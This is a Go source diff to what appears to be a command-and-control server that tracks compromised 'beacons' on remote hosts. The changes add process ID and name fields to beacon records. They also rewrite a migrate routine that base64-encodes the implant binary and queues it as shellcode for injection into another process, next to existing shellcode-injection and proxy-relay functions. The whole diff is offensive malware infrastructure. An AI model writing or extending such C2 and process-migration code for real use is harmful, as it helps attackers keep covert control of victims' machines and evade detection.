@@ -20,6 +20,8 @@ type CommandUpdate struct {
 	User string
 	Platform string
 	Arch string
+	Pid string
+	Pname string
 	Type string
 	Data string
 }
@@ -30,9 +32,11 @@ type Beacon struct {
 	User string
 	Platform string
 	Arch string
+	Pid string
+	Pname string
 	ExecBuffer []string
 	DownloadBuffer []string
-	UploadBuffer []string
+	UploadBuffer []string	
 	ShellcodeBuffer []string
 	ProxyClientBuffer []string
 	LastSeen time.Time
@@ -87,7 +91,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 
 	if beacon == nil || beacon.Ip == "n/a" {
 		fmt.Println("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
-		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, nil, nil, nil, nil, nil, time.Now() }
+		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, updateData.Pid, updateData.Pname, nil, nil, nil, nil, nil, time.Now() }
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -108,7 +112,7 @@ func listBeacons() {
 			status = " has not checked in yet."
 		}
 
-		fmt.Println("[" + strconv.Itoa(i) + "] {" + b.Id + "} " + b.User + "@" + b.Ip + " " + b.Platform + "\\" + b.Arch + status)
+		fmt.Println("[" + strconv.Itoa(i) + "] {" + b.Id + "\\" + b.Pname + "} " + b.User + "@" + b.Ip + " " + b.Platform + "\\" + b.Arch + status)
 	}
 }
 
@@ -286,19 +290,26 @@ func migrateBeacon(cmd []string) {
 		return
 	}
 
-	if _, err := os.Stat("out/" + activeBeacon.Id); os.IsNotExist(err) {
+	filename := "out/" + activeBeacon.Id
+	
+	if activeBeacon.Platform == "windows" {
+		filename += ".exe"
+	}
+
+	filename += ".bin"
+
+	if _, err := os.Stat(filename); os.IsNotExist(err) {
 		fmt.Println("File does not exist.")
 		return
 	}
 
-	fmt.Println(cmd[0], cmd[1])
-	f, _ := os.Open(cmd[1])
+	f, _ := os.Open(filename)
     reader := bufio.NewReader(f)
     content, _ := ioutil.ReadAll(reader)
     encoded := base64.StdEncoding.EncodeToString(content)
 	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
-	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, cmd[2])
-	activeBeacon.ExecBuffer = append(activeBeacon.ExecBuffer, "exit")
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, cmd[1])
+	activeBeacon.ExecBuffer = append(activeBeacon.ExecBuffer, "migrate")
 }
 
 func injectShellcode(cmd []string) {
@@ -322,7 +333,7 @@ func injectShellcode(cmd []string) {
 }
 
 func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
-	pseudoBeacon := Beacon { "0.0.0.0", targetId, "",  "", "", nil, nil, nil, nil, nil, time.Now() }
+	pseudoBeacon := Beacon { "0.0.0.0", targetId, "",  "", "", "", "", nil, nil, nil, nil, nil, time.Now() }
 	data, err := json.Marshal(pseudoBeacon)
 	
 	if err != nil {
